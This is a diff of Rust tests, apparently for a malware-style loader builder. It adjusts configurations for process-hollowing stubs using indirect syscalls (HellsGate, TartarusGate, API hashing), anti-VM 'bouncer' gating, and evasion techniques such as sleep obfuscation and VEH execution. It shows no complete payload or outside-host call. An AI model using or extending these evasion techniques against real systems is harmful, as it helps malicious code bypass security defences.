@@ -1580,6 +1580,7 @@ dependencies = [
                 crate::engine::syscalls::SyscallsConfig {
                     mode: crate::engine::syscalls::SyscallsMode::Indirect,
                     resolver: crate::engine::syscalls::Resolver::HellsGate,
+                    ..Default::default()
                 },
             ),
         ];
@@ -1663,6 +1664,7 @@ dependencies = [
         let syscalls = crate::engine::syscalls::SyscallsConfig {
             mode: crate::engine::syscalls::SyscallsMode::Indirect,
             resolver: crate::engine::syscalls::Resolver::TartarusGate,
+            ..Default::default()
         };
         let out = build_hollowing_exe(&build_dir, "tartarus", &syscalls, &plaintext);
 
@@ -1707,6 +1709,7 @@ dependencies = [
         let syscalls = crate::engine::syscalls::SyscallsConfig {
             mode: crate::engine::syscalls::SyscallsMode::Indirect,
             resolver: crate::engine::syscalls::Resolver::ApiHash,
+            ..Default::default()
         };
         let out = build_hollowing_exe(&build_dir, "api_hash", &syscalls, &plaintext);
 
@@ -1761,6 +1764,7 @@ dependencies = [
         let syscalls = crate::engine::syscalls::SyscallsConfig {
             mode: crate::engine::syscalls::SyscallsMode::Indirect,
             resolver: crate::engine::syscalls::Resolver::HellsGate,
+            ..Default::default()
         };
         // The real test payload (it prints a fixed marker), not the synthetic
         // bytes the compile-only tests use: this test actually runs the stub,
@@ -1971,6 +1975,7 @@ fn dec_xor(bytes: &[u8], key: &[u8; 32]) -> Vec<u8> {
 fn main() {}
 
 $SYSCALLS_BLOCK$
+$TLS_HANDOFF_BLOCK$
 $ARGS_BLOCK$
 $IMPORTS_BLOCK$
 "#;
@@ -2058,9 +2063,14 @@ $IMPORTS_BLOCK$
             }),
             RuntimeStep::new(TechniqueKind::Bouncer {
                 params: bouncer::Params {
-                    hostname: Some("WORKSTATION-*".to_string()),
-                    not_in_vm: Some(true),
-                    min_ram_mb: Some(2048),
+                    require: vec![
+                        bouncer::Requirement::Hostname("WORKSTATION-*".to_string()),
+                        bouncer::Requirement::RamMb(2048),
+                    ],
+                    anti_analysis: bouncer::AntiAnalysis {
+                        hypervisor: true,
+                        sandbox: false,
+                    },
                     ..bouncer::Params::default()
                 },
             }),
@@ -2127,11 +2137,7 @@ $IMPORTS_BLOCK$
         x64_only.sort_unstable();
         assert_eq!(
             x64_only,
-            vec![
-                "hardware_breakpoints",
-                "sleep_obfuscation",
-                "stack_spoofing"
-            ],
+            vec!["hardware_breakpoints", "sleep_obfuscation", "veh_execution"],
             "the x64-only set changed; update this assertion deliberately"
         );
         assert!(
